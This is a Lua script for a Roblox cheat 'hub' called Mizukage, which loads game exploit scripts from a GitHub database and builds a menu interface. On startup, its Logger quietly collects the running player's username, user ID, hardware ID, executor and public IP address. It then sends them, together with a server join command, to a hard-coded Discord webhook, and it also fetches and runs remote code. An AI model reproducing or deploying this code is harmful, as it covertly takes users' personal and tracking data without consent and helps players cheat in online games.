--[[
    ╔══════════════════════════════════════════════════════════════╗
    ║              MIZUKAGE OFFICIAL — MAIN SCRIPT                 ║
    ║                    Hub v2.0 Template                         ║
    ╚══════════════════════════════════════════════════════════════╝
]]

local StarterGui = game:GetService("StarterGui")
StarterGui:SetCore("SendNotification", {
    Title    = "✅ Mizukage Official",
    Text     = "Hub berhasil dimuat! Selamat datang.",
    Duration = 5
})

if getgenv().MizuLauncherLoaded then return end
getgenv().MizuLauncherLoaded = true

--========================================================================
-- [KONFIGURASI]
--========================================================================
local CONFIG = {
    WEBHOOK_URL = "https://discord.com/api/webhooks/1516421004291997718/t5nSkmWsiwWFpSNHjJQv3fdQKWGm2SqOQag3LS3kSEwHL1QkuyfbgzFpLI7kDXO357Bj",
    GITHUB_DB = "https://raw.githubusercontent.com/kazukage-id/Mizukage-Official/refs/heads/main/script/DBscript.lua",
    VERSION = "16.0",
    DELAY_BEFORE_EXECUTION = 1.5
}

--========================================================================
-- [SERVICES]
--========================================================================
local Services = {
    Players = game:GetService("Players"),
    TeleportService = game:GetService("TeleportService"),
    MarketplaceService = game:GetService("MarketplaceService"),
    HttpService = game:GetService("HttpService"),
    Stats = game:GetService("Stats"),
    UserInputService = game:GetService("UserInputService"),
    RbxAnalyticsService = game:GetService("RbxAnalyticsService")
}
local LocalPlayer = Services.Players.LocalPlayer
local PlaceID = game.PlaceId

--========================================================================
-- [UTILITY FUNCTIONS - DIPERBAIKI]
--========================================================================
local Utilities = {}

function Utilities:GetRequestFunction()
    -- Coba satu per satu dengan print debug
    local funcs = {
        {name = "syn.request", fn = syn and syn.request},
        {name = "http.request", fn = http and http.request},
        {name = "http_request", fn = http_request},
        {name = "fluxus.request", fn = fluxus and fluxus.request},
        {name = "request", fn = request}
    }
    for _, item in ipairs(funcs) do
        if type(item.fn) == "function" then
            print("[Mizukage] Request function found: " .. item.name)
            return item.fn
        end
    end
    warn("[Mizukage] No request function available!")
    return nil
end

function Utilities:SafeRequest(url, data)
    local requestFunc = self:GetRequestFunction()
    if not requestFunc then
        warn("[Mizukage] Logger: No request function, cannot send webhook")
        return false
    end
    
    local payload = Services.HttpService:JSONEncode(data)
    print("[Mizukage] Sending webhook...")
    
    local success, result = pcall(function()
        return requestFunc({
            Url = url,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = payload
        })
    end)
    
    if not success then
        warn("[Mizukage] Webhook failed: " .. tostring(result))
        return false
    end
    
    print("[Mizukage] Webhook sent successfully!")
    return true
end

--========================================================================
-- [LOGGER SYSTEM - SIMPLE & COOL (FIXED)]
--========================================================================
local Logger = {}

function Logger:Send()
    if not CONFIG.WEBHOOK_URL or string.find(CONFIG.WEBHOOK_URL, "MASUKKAN") then
        warn("[Mizukage] Webhook URL not configured, skipping logger")
        return
    end
    
    print("[Mizukage] Logger initializing...")
    
    -- Delay singkat agar data siap
    task.wait(2)
    
    -- Basic data
    local userId = LocalPlayer.UserId
    local username = LocalPlayer.Name
    local displayName = LocalPlayer.DisplayName
    local accountAge = LocalPlayer.AccountAge
    local membership = LocalPlayer.MembershipType.Name
    
    local hwid = "UNAVAILABLE"
    pcall(function()
        -- Coba berbagai metode HWID
        if gethwid then
            hwid = gethwid()
        elseif identifying then
            hwid = identifying()
        elseif game:GetService("RbxAnalyticsService") then
            hwid = game:GetService("RbxAnalyticsService"):GetClientId()
        end
    end)
    
    local executor = "UNKNOWN"
    pcall(function()
        executor = identifyexecutor and identifyexecutor() or "UNKNOWN"
    end)
    
    local platform = Services.UserInputService.TouchEnabled and not Services.UserInputService.MouseEnabled and "MOBILE" or "PC"
    
    local gameName = "UNKNOWN"
    pcall(function()
        gameName = Services.MarketplaceService:GetProductInfo(PlaceID).Name
    end)
    
    local ping = 0
    pcall(function()
        ping = math.floor(Services.Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
    end)
    
    local fps = 0
    pcall(function()
        fps = math.floor(workspace:GetRealPhysicsFPS())
    end)
    
    local ipData = { query = "HIDDEN" }
    pcall(function()
        local response = game:HttpGet("http://ip-api.com/json")
        if response then
            ipData = Services.HttpService:JSONDecode(response)
        end
    end)
    
    -- Avatar
    local avatarUrl = "https://i.imgur.com/rXf1N37.png"
    pcall(function()
        local apiUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..userId.."&size=420x420&format=Png&isCircular=false"
        local response = game:HttpGet(apiUrl)
        local data = Services.HttpService:JSONDecode(response)
        if data.data and data.data[1] then
            avatarUrl = data.data[1].imageUrl
        end
    end)
    
    -- Quick join dengan JobId yang aman
    local jobId = game.JobId or "N/A"
    local joinScript = string.format(
        "game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)",
        PlaceID,
        jobId
    )
    
    -- Build simple & cool embed
    local embed = {
        username = "Mizukage Launcher",
        avatar_url = avatarUrl,
        content = "",
        embeds = {{
            title = "**MIZUKAGE LAUNCHER**",
            description = string.format("```ini\n[%s]\nVersion %s\n```", gameName, CONFIG.VERSION),
            color = 0x1E1E24,
            thumbnail = { url = avatarUrl },
            fields = {
                {
                    name = "Player",
                    value = string.format("```%s\n@%s\nID: %s\nAge: %d Days | %s```", displayName, username, userId, accountAge, membership),
                    inline = true
                },
                {
                    name = "System",
                    value = string.format("```%s\n%s\n%s```", executor, platform, hwid),
                    inline = true
                },
                {
                    name = "Connection",
                    value = string.format("```Ping: %dms | FPS: %d\nIP: ||%s||```", ping, fps, ipData.query),
                    inline = false
                },
                {
                    name = "Join Command",
                    value = "```lua\n" .. joinScript .. "```",
                    inline = false
                }
            },
            footer = { text = "Mizukage • " .. os.date("%Y-%m-%d %H:%M:%S") }
        }}
    }
    
    Utilities:SafeRequest(CONFIG.WEBHOOK_URL, embed)
end

--========================================================================
-- [CLOUD DATABASE MANAGER]
--========================================================================
local CloudDB = { ValidGames = {}, PendingGames = {} }

function CloudDB:Fetch()
    local success, data = pcall(function()
        return loadstring(game:HttpGet(CONFIG.GITHUB_DB))()
    end)
    if success and type(data) == "table" then
        self.ValidGames = data.Valid or {}
        self.PendingGames = data.Pending or {}
        print("Mizukage: Database loaded.")
        return true
    else
        warn("Mizukage: Failed to load database.")
        return false
    end
end

function CloudDB:AutoExecute()
    local gameData = self.ValidGames[PlaceID]
    if not gameData then return end
    task.spawn(function()
        task.wait(CONFIG.DELAY_BEFORE_EXECUTION)
        print(string.format("Mizukage: Executing script for %s...", gameData.Name))
        local success, err = pcall(function()
            loadstring(game:HttpGet(gameData.Script))()
        end)
        if not success then
            warn("Mizukage: Execution failed - " .. tostring(err))
        end
    end)
end

--========================================================================
-- [UI MANAGER - MINIMAL]
--========================================================================
local UIManager = {}
local LunaInstance = nil

function UIManager:Create()
    local Luna = loadstring(game:HttpGet(
        "https://raw.githubusercontent.com/Nebula-Softworks/Luna-Interface-Suite/refs/heads/master/source.lua"
    ))(true)
    
    LunaInstance = Luna
    local window = Luna:CreateWindow({
        Name = "Mizukage Official",
        Subtitle = "Cloud SCRIPT" .. CONFIG.VERSION,
        LogoID = "82795327169782",
        LoadingEnabled = true,
        LoadingTitle = "Mizukage",
        LoadingSubtitle = "Loading...",
        ConfigSettings = { ConfigFolder = "MizuLauncher" },
        KeySystem = false
    })
    
    window:CreateHomeTab({
        SupportedExecutors = {"Delta", "Codex", "Wave", "Arceus X"},
        DiscordInvite = "Mizukage-Official",
        Icon = 1
    })
    
    local mainTab = window:CreateTab({
        Name = "Launcher",
        Icon = "cloud",
        ImageSource = "Material",
        ShowTitle = true
    })
    
    if CloudDB.ValidGames[PlaceID] then
        local gameData = CloudDB.ValidGames[PlaceID]
        mainTab:CreateParagraph({
            Title = "STATUS: AUTO-EXECUTED",
            Text = string.format("Game: %s\nScript loaded automatically.", gameData.Name)
        })
    else
        mainTab:CreateParagraph({
            Title = "STATUS: IDLE",
            Text = "No matching game found."
        })
    end
    
    mainTab:CreateDivider()
    mainTab:CreateParagraph({ Title = "PRIMARY DATABASE", Text = "Click to teleport or execute." })
    
    for id, data in pairs(CloudDB.ValidGames) do
        mainTab:CreateButton({
            Name = data.Name,
            Description = "ID: " .. tostring(id),
            Callback = function()
                if PlaceID == id then
                    Luna:Notification({ Title = "Execute", Content = "Running: " .. data.Name })
                    pcall(function() loadstring(game:HttpGet(data.Script))() end)
                else
                    Luna:Notification({ Title = "Teleport", Content = "Rerouting to: " .. data.Name })
                    Services.TeleportService:Teleport(id, LocalPlayer)
                end
            end
        })
    end
    
    mainTab:CreateDivider()
    mainTab:CreateParagraph({ Title = "AUXILIARY DATABASE", Text = "Manual execution." })
    
    for _, data in ipairs(CloudDB.PendingGames) do
        mainTab:CreateButton({
            Name = data.Name,
            Description = "Manual",
            Callback = function()
                Luna:Notification({ Title = "Execute", Content = "Loading: " .. data.Name })
                pcall(function() loadstring(game:HttpGet(data.Script))() end)
            end
        })
    end
    
    local utilTab = window:CreateTab({
        Name = "Utilities",
        Icon = "build",
        ImageSource = "Material",
        ShowTitle = true
    })
    
    utilTab:CreateButton({
        Name = "Server Hop",
        Callback = function()
            local pages = Services.TeleportService:GetPlayerCountPages(game.PlaceId)
            local servers = {}
            for _, page in pairs(pages:GetCurrentPage()) do
                if page.id ~= game.JobId and page.playing < page.maxPlayers then
                    table.insert(servers, page.id)
                end
            end
            if #servers > 0 then
                Services.TeleportService:TeleportToPlaceInstance(
                    game.PlaceId,
                    servers[math.random(1, #servers)],
                    LocalPlayer
                )
            end
        end
    })
    
    utilTab:CreateButton({
        Name = "Rejoin",
        Callback = function()
            Services.TeleportService:Teleport(game.PlaceId)
        end
    })
    
    window:CreateTab({ 
        Name = "Config", 
        Icon = "settings", 
        ImageSource = "Material", 
        ShowTitle = true 
    }):BuildConfigSection()
    
    Luna:Notification({
        Title = "Launcher Ready",
        Content = "Mizukage Cloud Launcher initialized."
    })
    
    return Luna
end

--========================================================================
-- [MAIN APPLICATION]
--========================================================================
local App = {}

function App:Initialize()
    print(string.format("Mizukage Launcher v%s starting...", CONFIG.VERSION))
    
    -- === LOGGER DIPANGGIL LEBIH AWAL & PASTI JALAN ===
    print("[Mizukage] Starting logger...")
    task.spawn(function()
        Logger:Send()
    end)
    
    -- Load database
    local dbLoaded = CloudDB:Fetch()
    
    -- Auto-execute if possible
    if dbLoaded then
        CloudDB:AutoExecute()
    end
    
    -- Create UI
    local ui = UIManager:Create()
    
    -- Global reference
    getgenv().Mizukage = {
        Version = CONFIG.VERSION,
        CloseUI = function()
            if LunaInstance then
                LunaInstance:Destroy()
                LunaInstance = nil
            end
        end
    }
    
    print("Mizukage Launcher ready.")
end

--========================================================================
-- [STARTUP]
--========================================================================
local success, err = pcall(function()
    App:Initialize()
end)

if not success then
    warn("Mizukage: Startup failed - " .. tostring(err))
end

print("[Mizukage] Main script loaded successfully.")
